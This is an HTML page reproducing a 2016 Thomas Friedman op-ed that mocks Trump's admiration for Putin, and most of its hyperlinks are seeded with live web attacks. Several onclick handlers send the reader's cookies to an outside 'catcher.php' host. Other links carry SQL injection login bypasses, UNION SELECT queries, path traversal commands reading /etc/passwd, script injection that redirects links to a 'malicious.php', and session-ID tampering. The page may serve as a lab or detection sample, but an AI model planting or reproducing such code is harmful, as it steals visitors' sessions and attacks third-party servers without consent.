<h2>Donald Trump’s Putin Crush</h2>

<p class="details">Thomas L. Friedman SEPT. 14, 2016<a href="#"></a> </p>
<h2 align="right"><a href="20160913-opinion.php"> Previous </a> </h2>

<p>
When it comes to rebutting Donald Trump’s <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">idiotic observation </a> that Vladimir Putin is a strong leader — “far more than our president has been a leader” — it is hard to top the assessment of <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Russian-born Garry Kasparov,</a> the former world chess champion, which The Times’s Andrew Higgins quoted in his story from Moscow: “Vladimir Putin is a strong leader in the same way that arsenic is a strong drink. Praising a brutal K.G.B. dictator, especially as preferable to a democratically elected U.S. president, whether you like Obama or hate him, is <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> despicable and dangerous.”</a>
</p> <p>
Indeed, Kasparov’s point cuts to the core of what is so scary about a <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">Trump presidency:</a> Trump is what The Economist has called “the leading exponent of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">‘post-truth’ </a> politics — a reliance on assertions that ‘feel true’ but have no basis in fact,” and, sadly, “his brazenness is not punished, but taken as evidence of his willingness to stand up to elite power.” When politics becomes <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">“like pro-wrestling,”</a> society pays a huge cost, The Economist added, because any complex explanation of any problem is dismissed as experts just trying “to bamboozle everyone else.”
</p> <p>
So Trump just skips from blaming Mexican immigrants for high murder rates, to President Obama for inventing ISIS, to China for creating the concept of global warming, to thousands of Muslims in New Jersey for celebrating 9/11, to Obama for really having been born in Kenya, to an I.R.S. audit for preventing him from showing us his tax returns — <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">which would probably </a> show that he paid no taxes.
</p> <p>
Every word of it is a lie that most in his own party won’t call out. Can you imagine the damage Trump could do to the fabric of our democracy if he had the White House pulpit from which to preach his <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">post-truth politics </a> — how it would filter down into public discourse at large and infect every policy debate?
</p> <p>
“Donald Trump has not only brought haters into the <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">mainstream, he has normalized hate </a> for a much broader swathe of the population who were perhaps already disaffected but had their grievances and latent prejudices held in check by social norms,” observed Josh Marshall, publisher of TalkingPointsMemo.com, in his blog on Saturday. “This isn’t some minor point or critique. It’s a fundamental part of what is at stake in this election, what makes it different from Obama v. Romney. … This election has become a battle to <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> combat the moral and civic cancer </a> Trump has [been] injecting into the body politic.”
</p> <p>
Think about the ridiculous trope Trump has been peddling, that if only Obama were as <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">“strong” as Putin.</a> Well, if he were, here are some of the benefits America would enjoy:
</p> <p>
A 2015 report in The Moscow Times noted that <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">“life expectancy in Russia </a> has been growing several times slower than in the rest of the world for the past 20 years, according to a research by the U.S.-based Institute for Health Metrics and Evaluation.” That coincides almost exactly with Putin’s leadership of the country. The article explained, “During the period of 1990-2013 [life expectancy] only grew by 1.8 years in Russia, while the global average number increased by 6.2 years, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">pushing Russia out </a> of the top 100 countries with the highest life expectancy and placing it in 108th position — between Iraq and North Korea.”
</p> <p>
Why don’t we have a leader strong enough to slow gains in the life expectancy of an entire nation?
</p> <p>
An investigation by the World Anti-Doping Agency released last summer found that Putin’s Russia was operating a state-sponsored doping scheme for four years across the “vast majority” of Summer and Winter Olympic sports. According to a July 18, 2016, BBC report on the investigation, “Russia’s sports ministry ‘directed, controlled and oversaw’ <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> manipulation of urine samples provided by its athletes.”</a> Scores of Russian athletes were barred from the Rio Olympics as a result.
</p> <p>
I get it: A weak president doesn’t dare tamper with his Olympic athletes. A strong president dopes up his Summer and Winter Olympic teams for multiple Games.
</p> <p>
Since Putin invaded Ukraine to shore up his faltering domestic popularity, and then got hit with Western economic sanctions, the dollar-ruble exchange rate has gone from around 36 rubles to the dollar to 65 rubles to the dollar.  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> Russia’s economic growth fell 3.7 percent in 2015,</a> and the I.M.F. predicts it will fall 1 percent in 2016. Inflation in Russia doubled to 15.4 percent in 2015, compared with 7.8 percent in 2014. A World Bank report quoted by the BBC in April said “the number of Russians living below the poverty line will grow at its fastest pace in more than 17 years in 2016.”
</p> <p>
It takes a strong leader to shrink his currency by 50 percent, double inflation and vastly accelerate poverty in just two years. A weak leader could never do that.
</p> <p>
Putin is a leader who is always looking for dignity in all the wrong places — by investing in bullying wars, not in his own people; by jailing and likely poisoning his opponents; and by being so insecure that he just shut Russia’s last independent polling firm after it indicated that many Russians may not vote in the coming parliamentary elections because, among other things, they think they’re “rigged.”
</p> <p>
This is the man Donald Trump admires more than our own president.

</p>




